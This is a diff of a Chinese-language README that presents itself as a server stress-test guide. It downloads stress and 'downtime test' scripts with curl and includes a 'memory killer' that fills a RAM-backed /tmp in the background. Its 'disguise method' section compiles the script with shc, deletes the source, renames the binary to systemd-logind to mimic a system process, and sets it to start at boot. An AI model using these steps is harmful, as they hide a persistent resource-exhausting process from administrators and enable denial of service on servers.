@@ -4,9 +4,18 @@
 
 安装命令：```apt install stress-ng -y```
 
-下载脚本：```curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/yali.sh```
+下载脚本：
+-压力测试脚本
 
-内存杀手:```sudo mount -t tmpfs -o size=100% tmpfs /tmp```
+```curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/yali.sh```
+
+-宕机测试脚本
+
+```curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/oom.sh```
+
+内存杀手:
+
+```sudo mount -t tmpfs -o size=100% tmpfs /tmp```
 
 ```nohup cat /dev/zero > /tmp/bigfile >/dev/null 2>&1 &```
 
@@ -14,25 +23,30 @@
 
 下载后使用编辑器编辑配置
 
-伪装方法：
+# 伪装方法：
 
-# 依赖准备
+- 依赖准备
+
 ```apt install shc -y```
 
 ```apt install gcc make -y```
 
-# 编译脚本
+- 编译脚本
+
 ```apt install gcc make -y```
+
 ```shc -r -f yali.sh```
-# 得到 yali.sh.x 二进制程序
+
+- 得到 yali.sh.x 二进制程序
+
 ```rm -f yali.sh.x.c```   # 删除无用C源码
 
-# 伪装成系统常用进程
+- 伪装成系统常用进程
+
 ```mv yali.sh.x systemd-logind```
 
 ```chmod 700 systemd-logind```
-
-- 开机自启
+# 开机自启
 
 编辑systemd文件
 
